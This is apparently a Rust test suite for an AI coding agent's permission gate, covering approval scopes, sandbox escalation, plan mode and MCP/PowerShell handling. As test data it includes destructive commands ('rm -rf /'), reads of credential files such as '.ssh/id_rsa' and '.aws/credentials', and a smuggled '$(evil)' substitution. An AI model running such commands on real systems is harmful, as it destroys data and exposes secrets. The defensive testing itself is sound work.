    /// An unparseable script is remember-able too, keyed on its own text: the
    /// identical command skips the second question, a different one still asks,
    /// and the durable scope is never offered — plan 145, the key is this run's
    /// own command text, so a stored copy could only ever match a byte-identical
    /// re-run. The gate here *has* a writable store, which is what makes the
    /// missing `Project` scope a statement rather than an accident.
    /// Plan 129 fixed this on the escalation door; the ordinary gate is the
    /// door the user actually met it at. The fixture writes a file on purpose:
    /// `2>&1` used to be enough to land here, and plan 144 took it back, so
    /// what is left on this path is a script that really does something the
    /// argv cannot show.
    #[tokio::test]
    async fn opaque_bash_is_remembered_verbatim_for_the_session() {
        let approver = ScriptedApprover::new(vec![
            Decision::Allow(ApprovalScope::WorkspaceSession),
            Decision::Allow(ApprovalScope::Once),
        ]);
        let writer = ScriptedWriter::succeeding();
        let p = gate_with_writer(Mode::Manual, approver.clone(), writer.clone());
        let script = "cd sub && go test ./pkg -run X > out.log";
        assert!(ok(&p, "bash", bash(script)).await);
        assert_eq!(
            approver.asked()[0].approval_scopes,
            vec![ApprovalScope::Once, ApprovalScope::WorkspaceSession],
            "a writable store is not enough: an opaque script has no durable scope"
        );
        assert_eq!(
            approver.asked()[0].remember_rules,
            Some(vec!["only this exact command text".to_string()]),
            "the prompt states the real granularity"
        );

        assert!(ok(&p, "bash", bash(script)).await);
        assert_eq!(approver.ask_count(), 1, "same text, not asked again");

        // Escaping the sandbox is a different consent: the contained run's yes
        // does not cover it, so it is asked (and granted Once here).
        assert!(
            ok(
                &p,
                "bash",
                json!({"command": script, "disable_sandbox": true})
            )
            .await
        );
        assert_eq!(approver.ask_count(), 2);

        // A different opaque script still asks — the approver is exhausted, so
        // the prompt denies, which is what proves it asked.
        assert!(!ok(&p, "bash", bash("cd sub && go test ./other > out.log")).await);
        assert_eq!(approver.ask_count(), 3);

        assert!(
            writer.calls.lock().unwrap().is_empty(),
            "nothing about an opaque script reaches the durable store"
        );
    }

    #[tokio::test]
    async fn file_write_remembers_parent_directory_scope() {
        let approver =
            ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::WorkspaceSession)]);
        let p = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        assert!(ok(&p, "write_file", file("/elsewhere/src/a.rs")).await);
        assert!(
            ok(&p, "write_file", file("/elsewhere/src/b.rs")).await,
            "same directory cached"
        );
        assert!(
            !ok(&p, "write_file", file("/elsewhere/src/deep/c.rs")).await,
            "subdirectory asks"
        );
        assert_eq!(approver.ask_count(), 2);
        assert_eq!(
            approver.asked()[0].remember_rules,
            Some(vec!["write_file(/elsewhere/src/**)".to_string()])
        );
    }

    // ── denial semantics & misc ─────────────────────────────────────────

    #[tokio::test]
    async fn user_denial_message_guides_the_model() {
        let approver = ScriptedApprover::new(vec![]);
        let p = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        let err = p
            .check("write_file", &file("/elsewhere/x.txt"), 0)
            .await
            .unwrap_err();
        assert!(err.contains("declined"), "{err}");
        assert!(err.contains("different approach"), "{err}");
    }

    /// Plan 216: inside a turn a No is its own refusal, which dispatch turns
    /// into the end of the turn; a caller outside any turn (`check_call`) has no
    /// turn to end and hears the ordinary denial. A plain Deny stays a denial on
    /// both paths.
    #[tokio::test]
    async fn a_stop_is_its_own_refusal_only_inside_a_turn() {
        let approver = ScriptedApprover::new(vec![Decision::Stop, Decision::Stop, Decision::Deny]);
        let p = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        let write = file("/elsewhere/x.txt");
        assert_eq!(
            p.check_call_with_resolved_path(
                "write_file",
                &write,
                None,
                None,
                0,
                Default::default()
            )
            .await,
            Err(Refusal::Stopped)
        );
        assert_eq!(
            p.check_call("write_file", &write, 0, false).await,
            Err(user_denial("write_file"))
        );
        assert_eq!(
            p.check_call_with_resolved_path(
                "write_file",
                &write,
                None,
                None,
                0,
                Default::default()
            )
            .await,
            Err(Refusal::Denied(user_denial("write_file")))
        );
        assert_eq!(approver.ask_count(), 3);
    }

    #[tokio::test]
    async fn no_approver_auto_denies_instead_of_hanging() {
        let p = Permissions::new(
            Mode::Manual,
            &rules(&[], &[], &[]),
            PathBuf::from("/work/proj"),
            None,
        )
        .unwrap();
        assert!(
            p.check("write_file", &file("/elsewhere/x"), 0)
                .await
                .is_err()
        );
        assert!(
            p.check("bash", &bash("ls"), 0).await.is_ok(),
            "read-only still passes"
        );
        assert!(
            p.check("write_file", &file("x"), 0).await.is_ok(),
            "a contained write needs no approver either"
        );
    }

    #[tokio::test]
    async fn description_carries_depth_hazard_and_detail() {
        let approver = ScriptedApprover::new(vec![Decision::Deny, Decision::Deny]);
        let p = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        let _ = p.check("bash", &bash("rm -rf x"), 1).await;
        let _ = p.check("write_file", &file("/elsewhere/a.txt"), 0).await;
        let asked = approver.asked();
        assert_eq!(
            asked[0].description,
            "[sub-agent] [destructive] bash: rm -rf x"
        );
        assert_eq!(asked[1].description, "write_file: /elsewhere/a.txt");
    }

    /// The approval request carries a file-change diff for edit/write so the
    /// human sees the change; other tools carry none. The kind travels with the
    /// text: a frontend must never have to infer "this is a diff".
    #[tokio::test]
    async fn confirm_request_carries_a_change_preview() {
        let approver = ScriptedApprover::new(vec![Decision::Deny, Decision::Deny, Decision::Deny]);
        let p = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        let _ = p
            .check(
                "edit_file",
                &json!({"path": "/elsewhere/f.rs", "old_string": "foo", "new_string": "bar"}),
                0,
            )
            .await;
        // A path that does not exist is previewed as a new file.
        let _ = p
            .check(
                "write_file",
                &json!({"path": "/work/proj/does-not-exist.txt", "content": "hi\n"}),
                0,
            )
            .await;
        let _ = p.check("bash", &bash("rm -rf x"), 0).await;
        let asked = approver.asked();
        // The file cannot be read here, so the edit degrades to a two-string diff.
        assert_eq!(
            asked[0].preview,
            Some(ConfirmPreview::FileChange("-1  foo\n+1  bar".into()))
        );
        assert_eq!(
            asked[1].preview,
            Some(ConfirmPreview::FileChange("(new file)\n+1  hi".into()))
        );
        assert_eq!(asked[2].preview, None, "non-file calls carry no preview");
    }

    /// The sandbox auto-allow layer: a contained call runs without asking —
    /// opaque scripts included, containment replaces analysis — while the
    /// identical un-contained call still asks.
    #[tokio::test]
    async fn sandbox_auto_allow_skips_asking_for_contained_calls_only() {
        let approver = ScriptedApprover::new(vec![]);
        let p = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        for cmd in ["echo x > f.txt", "cargo build", "ls $(evil)"] {
            assert!(
                p.check_call("bash", &bash(cmd), 0, /*sandbox_auto_allow*/ true)
                    .await
                    .is_ok(),
                "{cmd}"
            );
        }
        assert_eq!(approver.ask_count(), 0);

        // Same non-readonly call, not contained: reaches the ask layer
        // (empty script = deny).
        assert!(
            p.check_call(
                "bash",
                &bash("cargo build"),
                0,
                /*sandbox_auto_allow*/ false
            )
            .await
            .is_err()
        );
        assert_eq!(approver.ask_count(), 1);
    }

    /// Everything above the auto-allow layer keeps its say: deny rules
    /// reject outright, safety checks and explicit ask rules still go to
    /// the human (the ask-rule half is deliberately stricter than cc).
    #[tokio::test]
    async fn deny_safety_and_ask_rules_outrank_sandbox_auto_allow() {
        let approver = ScriptedApprover::new(vec![]);
        let p = gate(
            Mode::Manual,
            rules(&[], &["bash(git push *)"], &[]),
            approver.clone(),
        );
        assert!(
            p.check_call("bash", &bash("git push origin"), 0, true)
                .await
                .is_err()
        );
        assert_eq!(approver.ask_count(), 0, "deny is a verdict, not a question");

        let approver = ScriptedApprover::new(vec![Decision::Deny]);
        let p = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        assert!(
            p.check_call("bash", &bash("rm -rf /tmp/x"), 0, true)
                .await
                .is_err()
        );
        assert!(approver.asked()[0].description.contains("[destructive]"));

        let approver = ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Once)]);
        let p = gate(
            Mode::Manual,
            rules(&[], &[], &["bash(cargo publish *)"]),
            approver.clone(),
        );
        assert!(
            p.check_call("bash", &bash("cargo publish --dry-run"), 0, true)
                .await
                .is_ok()
        );
        assert_eq!(
            approver.ask_count(),
            1,
            "ask rule asked despite the sandbox"
        );
    }

    /// The escalation consent step: approver decisions map to Approved/
    /// Declined, bypass auto-approves without asking, and no approver (or
    /// mock) reports NotAttempted so the caller falls back to the hint.
    #[tokio::test]
    async fn escalate_sandbox_maps_decision_and_mode() {
        let approver = ScriptedApprover::new(vec![
            Decision::Allow(ApprovalScope::Once),
            Decision::Deny,
            Decision::Stop,
        ]);
        let p = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        assert_eq!(
            p.escalate_sandbox("npm install", None, 0).await,
            EscalationOutcome::Approved(EscalationApproval::User)
        );
        assert_eq!(
            p.escalate_sandbox("git push", None, 0).await,
            EscalationOutcome::Declined
        );
        assert_eq!(
            p.escalate_sandbox("git push", None, 0).await,
            EscalationOutcome::Stopped
        );
        assert_eq!(approver.ask_count(), 3);
        assert!(
            approver.asked()[0]
                .description
                .contains("[sandbox denied — run without sandbox?] bash: npm install")
        );

        // Bypass (--permission-mode bypass): escalate without asking.
        let approver = ScriptedApprover::new(vec![]);
        let p = gate(Mode::Bypass, rules(&[], &[], &[]), approver.clone());
        assert_eq!(
            p.escalate_sandbox("curl x", None, 0).await,
            EscalationOutcome::Approved(EscalationApproval::Bypass)
        );
        assert_eq!(approver.ask_count(), 0, "bypass does not prompt");

        // allow_all (tests / --mock): never auto-escalate.
        assert_eq!(
            Permissions::allow_all()
                .escalate_sandbox("rm x", None, 0)
                .await,
            EscalationOutcome::NotAttempted
        );

        // No approver available: NotAttempted, so the caller keeps the hint.
        let p = Permissions::new(
            Mode::Manual,
            &PermissionRules::default(),
            PathBuf::from("/"),
            None,
        )
        .unwrap();
        assert_eq!(
            p.escalate_sandbox("touch x", None, 0).await,
            EscalationOutcome::NotAttempted
        );
        p.set_mode(Mode::Bypass);
        assert_eq!(
            p.escalate_sandbox("touch x", None, 0).await,
            EscalationOutcome::Approved(EscalationApproval::Bypass)
        );
    }

    /// The escalation ask is remember-able like any other: answering with the
    /// workspace scope records `sandbox_escalate(...)` and the next identical
    /// command escalates without a second prompt. This is the whole point —
    /// one real session asked about the same `go test` over and over.
    #[tokio::test]
    async fn a_remembered_escalation_is_not_asked_again() {
        let approver =
            ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::WorkspaceSession)]);
        let p = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());

        assert_eq!(
            p.escalate_sandbox("go test ./pkg -run X", None, 0).await,
            EscalationOutcome::Approved(EscalationApproval::User)
        );
        assert_eq!(approver.ask_count(), 1);
        assert_eq!(
            approver.asked()[0].remember_rules,
            Some(vec!["sandbox_escalate(go test *)".to_string()]),
            "the offered rule is escalation-specific, not bash(...)"
        );
        assert!(
            approver.asked()[0]
                .approval_scopes
                .contains(&ApprovalScope::WorkspaceSession)
        );

        // Same two-word prefix, different arguments: covered, no second ask.
        assert_eq!(
            p.escalate_sandbox("go test ./other", None, 0).await,
            EscalationOutcome::Approved(EscalationApproval::Remembered)
        );
        assert_eq!(approver.ask_count(), 1, "remembered, so not asked again");

        // A different command is still asked about (the scripted approver is
        // exhausted, so a prompt would deny — which is what proves it asked).
        assert_eq!(
            p.escalate_sandbox("cargo build", None, 0).await,
            EscalationOutcome::Declined
        );
        assert_eq!(approver.ask_count(), 2);
    }

    /// A fresh session keeps the approver and the mode but none of what the old
    /// session remembered; plan mode falls back to the mode it was entered from.
    #[tokio::test]
    async fn a_fresh_session_forgets_session_approvals_and_leaves_plan_mode() {
        let approver =
            ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::WorkspaceSession)]);
        let p = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        assert_eq!(
            p.escalate_sandbox("go test ./pkg", None, 0).await,
            EscalationOutcome::Approved(EscalationApproval::User)
        );
        assert!(p.sandbox_escalation_remembered("go test ./other"));
        p.set_mode(Mode::Bypass);
        assert!(p.enter_plan());

        let fresh = p.fresh_session();
        assert_eq!(fresh.mode(), Mode::Bypass);
        assert!(!fresh.sandbox_escalation_remembered("go test ./other"));
        // The old gate is untouched: the new session did not reach into it.
        assert_eq!(p.mode(), Mode::Plan);
        assert!(p.sandbox_escalation_remembered("go test ./other"));
        // Same approver: back in manual, the fresh gate asks it (and, the
        // script exhausted, gets a no).
        fresh.set_mode(Mode::Manual);
        assert_eq!(
            fresh.escalate_sandbox("go test ./pkg", None, 0).await,
            EscalationOutcome::Declined
        );
        assert_eq!(approver.ask_count(), 2);
    }

    /// An opaque script cannot be keyed on, so it gets the session scope and not
    /// the durable one — and the prompt says the scope is every escalation, not
    /// this command. A review's probe scripts are opaque almost by construction
    /// (`tmp=$(mktemp -d …)`, a pipe into `tar`, a `cd`), so offering only
    /// `Once` here was offering the memory exactly where it could never apply.
    #[tokio::test]
    async fn an_opaque_command_can_still_be_remembered_for_the_session() {
        let approver =
            ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::WorkspaceSession)]);
        let p = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        let opaque = "tmp=$(mktemp -d) && git archive HEAD | tar -x -C \"$tmp\"";

        assert_eq!(
            p.escalate_sandbox(opaque, None, 0).await,
            EscalationOutcome::Approved(EscalationApproval::User)
        );
        assert_eq!(
            approver.asked()[0].approval_scopes,
            vec![ApprovalScope::Once, ApprovalScope::WorkspaceSession],
            "session scope offered, durable scope withheld"
        );
        assert_eq!(
            approver.asked()[0].remember_rules,
            Some(vec!["every sandbox escalation this session".to_string()]),
            "the prompt states the real scope"
        );

        // Blanket consent covers another opaque script and a parseable one.
        assert_eq!(
            p.escalate_sandbox("x=$(date) && echo $x", None, 0).await,
            EscalationOutcome::Approved(EscalationApproval::Remembered)
        );
        assert_eq!(
            p.escalate_sandbox("go test ./pkg", None, 0).await,
            EscalationOutcome::Approved(EscalationApproval::Remembered)
        );
        assert_eq!(approver.ask_count(), 1, "asked once for the whole session");

        // It also reaches the pre-execution check, so the sandboxed attempt that
        // was going to fail is skipped rather than run and thrown away.
        assert!(p.sandbox_escalation_remembered(opaque));
    }

    /// What the sandbox refused rides the prompt. Without it the notice tells
    /// the reader only that the sandbox blocked something, which is the one
    /// thing they already knew — and a blocked socket and a blocked write are
    /// answered with completely different knobs.
    #[tokio::test]
    async fn the_escalation_prompt_says_what_was_blocked() {
        let approver = ScriptedApprover::new(vec![Decision::Deny]);
        let p = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        let denial = crate::sandbox::SandboxDenial {
            kind: crate::sandbox::DenialKind::Network,
            evidence: "listen tcp6 [::1]:0: bind: operation not permitted".to_string(),
        };
        p.escalate_sandbox("go test ./pkg", Some(&denial), 0).await;
        let notice = approver.asked()[0]
            .notice
            .clone()
            .expect("the escalation ask carries a notice");
        assert!(notice.contains("(network)"), "{notice}");
        assert!(
            notice.contains("listen tcp6 [::1]:0: bind: operation not permitted"),
            "{notice}"
        );
    }

    #[tokio::test]
    async fn description_flags_sandbox_escape() {
        let approver = ScriptedApprover::new(vec![Decision::Deny]);
        let p = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        let input = serde_json::json!({"command": "git push", "disable_sandbox": true});
        let _ = p.check("bash", &input, 0).await;
        assert_eq!(
            approver.asked()[0].description,
            "[no sandbox] bash: git push"
        );
    }

    #[tokio::test]
    async fn allow_all_skips_every_layer() {
        let p = Permissions::allow_all();
        assert!(p.check("bash", &bash("rm -rf /"), 0).await.is_ok());
        assert!(
            p.check("write_file", &file(".git/hooks/x"), 0)
                .await
                .is_ok()
        );
    }

    // ── plan mode ───────────────────────────────────────────────────────

    /// Plan mode passes read-only exploration and refuses every mutating call
    /// outright — without consulting the approver (the point of the mode).
    /// exit_plan_mode is read-only here, so it is not blocked.
    #[tokio::test]
    async fn plan_mode_allows_reads_and_blocks_mutations() {
        let approver = ScriptedApprover::new(vec![]);
        let p = gate(Mode::Plan, rules(&[], &[], &[]), approver.clone());
        // Reads and read-only bash pass.
        assert!(ok(&p, "read_file", json!({"path": "x"})).await);
        assert!(ok(&p, "grep", json!({"pattern": "fn"})).await);
        assert!(ok(&p, "glob", json!({"pattern": "**/*.rs"})).await);
        assert!(ok(&p, "bash", bash("git status && ls")).await);
        assert!(ok(&p, "run_agent", json!({"prompt": "look around"})).await);
        assert!(ok(&p, "todo_write", json!({"todos": []})).await);
        assert!(ok(&p, "exit_plan_mode", json!({"plan": "do X"})).await);
        // Writes and side-effecting bash are refused.
        for (name, input) in [
            ("write_file", file("src/main.rs")),
            (
                "edit_file",
                json!({"path": "a.rs", "old_string": "a", "new_string": "b"}),
            ),
            ("bash", bash("echo hi > f.txt")),
            ("bash", bash("cargo build")),
            // Unknown tree options may take an operand and swallow `--`,
            // exposing `-o` as a write; the read-only classifier must not
            // vouch for them.
            ("bash", bash("tree --compress -- -o out.txt .")),
        ] {
            let err = p.check(name, &input, 0).await.unwrap_err();
            assert!(err.contains("plan mode"), "{name}: {err}");
        }
        assert_eq!(approver.ask_count(), 0, "plan mode never asks");
    }

    /// Plan mode sits above safety: a destructive command is a flat "no", not a
    /// "[destructive] approve?" prompt. A deny rule still wins over the mode.
    #[tokio::test]
    async fn plan_mode_blocks_destructive_before_asking_but_deny_still_wins() {
        let approver = ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Once)]);
        let p = gate(
            Mode::Plan,
            rules(&[], &["bash(git push *)"], &[]),
            approver.clone(),
        );
        let err = p.check("bash", &bash("rm -rf build"), 0).await.unwrap_err();
        assert!(err.contains("plan mode"), "{err}");
        assert_eq!(
            approver.ask_count(),
            0,
            "no [destructive] prompt in plan mode"
        );
        // Deny is checked before the plan gate, so its message is the one seen.
        let err = p
            .check("bash", &bash("git push origin main"), 0)
            .await
            .unwrap_err();
        assert!(err.contains("deny permission rule"), "{err}");
    }

    /// exit_plan_mode's approval step: approve → leave plan mode restoring the
    /// pre-plan mode; deny → stay in plan mode. set_mode records the mode plan
    /// was entered from.
    #[tokio::test]
    async fn confirm_exit_plan_switches_back_or_stays() {
        let approver =
            ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Once), Decision::Deny]);
        let p = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        // Enter plan from bypass: that becomes the restore target.
        p.set_mode(Mode::Bypass);
        p.set_mode(Mode::Plan);
        assert_eq!(p.mode(), Mode::Plan);

        assert_eq!(
            p.confirm_exit_plan("the plan", 0).await,
            PlanExitOutcome::Approved(Mode::Bypass)
        );
        assert_eq!(p.mode(), Mode::Bypass, "restored the pre-plan mode");
        // The approver saw the plan text, tagged as a plan — not as a diff,
        // which is what every frontend used to assume a preview was.
        assert_eq!(
            approver.asked()[0].preview,
            Some(ConfirmPreview::Plan("the plan".into()))
        );

        // Back into plan, this time deny: stay put.
        p.set_mode(Mode::Plan);
        assert_eq!(
            p.confirm_exit_plan("v2", 0).await,
            PlanExitOutcome::Declined
        );
        assert_eq!(p.mode(), Mode::Plan, "denied exit keeps plan mode");
    }

    /// A No on a plan (plan 216) is its own outcome — the tool ends the turn on
    /// it — and leaves plan mode exactly as a decline does.
    #[tokio::test]
    async fn confirm_exit_plan_reports_a_stop_and_stays_in_plan() {
        let approver = ScriptedApprover::new(vec![Decision::Stop]);
        let p = gate(Mode::Plan, rules(&[], &[], &[]), approver);
        assert_eq!(
            p.confirm_exit_plan("the plan", 0).await,
            PlanExitOutcome::Stopped
        );
        assert_eq!(p.mode(), Mode::Plan);
    }

    /// A construction-time plan mode restores to manual on exit (no prior mode).
    #[tokio::test]
    async fn confirm_exit_plan_restores_manual_when_started_in_plan() {
        let approver = ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Once)]);
        let p = gate(Mode::Plan, rules(&[], &[], &[]), approver.clone());
        assert_eq!(
            p.confirm_exit_plan("plan", 0).await,
            PlanExitOutcome::Approved(Mode::Manual)
        );
    }

    /// No approver (headless): exit is reported as blocked, not silently taken.
    #[tokio::test]
    async fn confirm_exit_plan_without_approver_reports_no_approver() {
        let p = Permissions::new(
            Mode::Plan,
            &PermissionRules::default(),
            PathBuf::from("/work/proj"),
            None,
        )
        .unwrap();
        assert_eq!(
            p.confirm_exit_plan("plan", 0).await,
            PlanExitOutcome::NoApprover
        );
        assert_eq!(p.mode(), Mode::Plan, "still in plan mode");
    }

    /// A rebased gate (a worktree sub-agent) shares the session mode: a mode
    /// change on the base is seen through the rebased copy, and vice versa.
    #[test]
    fn rebased_shares_the_session_mode() {
        let approver = ScriptedApprover::new(vec![]);
        let base = gate(Mode::Manual, rules(&[], &[], &[]), approver);
        let sub = base.for_workspace(crate::project::WorkspaceIdentity::resolve(Path::new(
            "/work/tree",
        )));
        base.set_mode(Mode::Plan);
        assert_eq!(
            sub.mode(),
            Mode::Plan,
            "mode change propagates to the rebase"
        );
        sub.set_mode(Mode::Manual);
        assert_eq!(base.mode(), Mode::Manual, "and back the other way");
    }

    /// The contract MCP integration relies on: an unknown (external) tool
    /// name defaults to asking; "allow for session" caches by whole tool
    /// name; the suggested persistent rule is the tool name and parses back.
    #[tokio::test]
    async fn mcp_style_tools_ask_by_default_and_remember_by_name() {
        let approver =
            ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::WorkspaceSession)]);
        let p = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        assert!(ok(&p, "memory__create_entities", json!({"k": "v"})).await);
        let asked = approver.asked();
        assert_eq!(
            asked[0].remember_rules,
            Some(vec!["memory__create_entities".to_string()])
        );
        assert!(parse_rule("memory__create_entities").is_ok());

        // Session-cached now; a different tool on the same server still asks.
        assert!(ok(&p, "memory__create_entities", json!({})).await);
        assert!(!ok(&p, "memory__delete_entities", json!({})).await);
        assert_eq!(approver.ask_count(), 2);

        // An allow rule by qualified name skips the approver entirely.
        let approver2 = ScriptedApprover::new(vec![]);
        let p2 = gate(
            Mode::Manual,
            rules(&["memory__create_entities"], &[], &[]),
            approver2.clone(),
        );
        assert!(ok(&p2, "memory__create_entities", json!({})).await);
        assert_eq!(approver2.ask_count(), 0);
    }

    #[tokio::test]
    async fn powershell_opaque_permission_truth_table_is_fail_closed() {
        let input = json!({"command": "Get-ChildItem"});

        let approver = ScriptedApprover::new(vec![]);
        let plan = gate(Mode::Plan, rules(&[], &[], &[]), approver.clone());
        let error = plan.check("powershell", &input, 0).await.unwrap_err();
        assert!(error.contains("plan mode"), "{error}");
        assert_eq!(approver.ask_count(), 0);

        {
            let approver = ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Once)]);
            let permissions = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
            assert!(permissions.check("powershell", &input, 0).await.is_ok());
            assert_eq!(approver.ask_count(), 1, "manual 必须审批");
            let request = &approver.asked()[0];
            assert_eq!(request.remember_rules, None);
            assert!(
                request
                    .description
                    .contains("[unclassified PowerShell] powershell: Get-ChildItem")
            );
        }

        let approver = ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Once)]);
        let permissions = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        assert!(
            permissions
                .check_call("powershell", &input, 0, /*sandbox_auto_allow*/ true)
                .await
                .is_ok()
        );
        assert_eq!(approver.ask_count(), 1, "sandbox auto-allow never applies");
    }

    #[tokio::test]
    async fn powershell_whole_tool_rules_and_nonremembering_decisions() {
        let input = json!({"command": "Set-Content x y"});

        let approver = ScriptedApprover::new(vec![]);
        let denied = gate(
            Mode::Manual,
            rules(&[], &["powershell"], &[]),
            approver.clone(),
        );
        assert!(denied.check("powershell", &input, 0).await.is_err());
        assert_eq!(approver.ask_count(), 0);

        let approver = ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Once)]);
        let asked = gate(
            Mode::Manual,
            rules(&["powershell"], &[], &["powershell"]),
            approver.clone(),
        );
        assert!(asked.check("powershell", &input, 0).await.is_ok());
        assert_eq!(approver.ask_count(), 1, "ask outranks whole-tool allow");

        let approver = ScriptedApprover::new(vec![]);
        let allowed = gate(
            Mode::Manual,
            rules(&["powershell"], &[], &[]),
            approver.clone(),
        );
        assert!(allowed.check("powershell", &input, 0).await.is_ok());
        assert_eq!(approver.ask_count(), 0);

        let approver = ScriptedApprover::new(vec![
            Decision::Allow(ApprovalScope::Once),
            Decision::Allow(ApprovalScope::Once),
        ]);
        let permissions = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        assert!(permissions.check("powershell", &input, 0).await.is_ok());
        assert!(permissions.check("powershell", &input, 0).await.is_ok());
        assert_eq!(
            approver.ask_count(),
            2,
            "opaque PowerShell is neither cached nor persisted"
        );
        assert!(
            approver
                .asked()
                .iter()
                .all(|request| request.remember_rules.is_none())
        );
    }

    #[tokio::test]
    async fn powershell_sensitive_windows_paths_require_approval_in_manual() {
        for command in [
            r"Get-Content $env:USERPROFILE\.ssh\id_rsa",
            r"Get-Content $HOME/.aws/credentials",
            r"Get-Content C:\Users\me\.env.production",
            r"Get-Content ${env:USERPROFILE}/.kloop/config.toml",
            r"Get-Content .ssh/id_rsa",
            r"Get-Content .env.local",
        ] {
            let approver = ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Once)]);
            let permissions = gate(
                Mode::Manual,
                rules(&["powershell"], &[], &[]),
                approver.clone(),
            );
            assert!(
                permissions
                    .check("powershell", &json!({"command": command}), 0)
                    .await
                    .is_ok()
            );
            assert_eq!(approver.ask_count(), 1, "{command}");
            let request = &approver.asked()[0];
            assert!(request.description.contains("[sensitive PowerShell path]"));
            assert_eq!(request.remember_rules, None);
        }
    }

    #[tokio::test]
    async fn read_path_blocked_hides_sensitive_and_read_deny_paths() {
        let approver = ScriptedApprover::new(vec![]);
        let p = gate(
            Mode::Manual,
            rules(&[], &["read_file(**/*.pem)"], &[]),
            approver.clone(),
        );
        let b = |path: &str| p.read_path_blocked(Path::new(path));
        // sensitive list — filtered whatever the deny rules say
        assert!(b("/work/proj/.env"));
        assert!(b("/work/proj/config/.env.local"));
        assert!(b("/work/proj/.ssh/id_rsa"));
        // read_file deny glob — matched via the cwd-relative path
        assert!(b("/work/proj/certs/server.pem"));
        assert!(b("/work/proj/secret.pem"));
        // ordinary readable files pass
        assert!(!b("/work/proj/src/main.rs"));
        assert!(!b("/work/proj/notes.txt"));

        // whole-tool `read_file` deny hides every path (grep can't read what
        // read_file can't); `--mock`/tests (`allow_all`) filter nothing.
        let p = gate(Mode::Manual, rules(&[], &["read_file"], &[]), approver);
        assert!(p.read_path_blocked(Path::new("/work/proj/src/main.rs")));
        assert!(!Permissions::allow_all().read_path_blocked(Path::new("/x/.env")));
    }
}
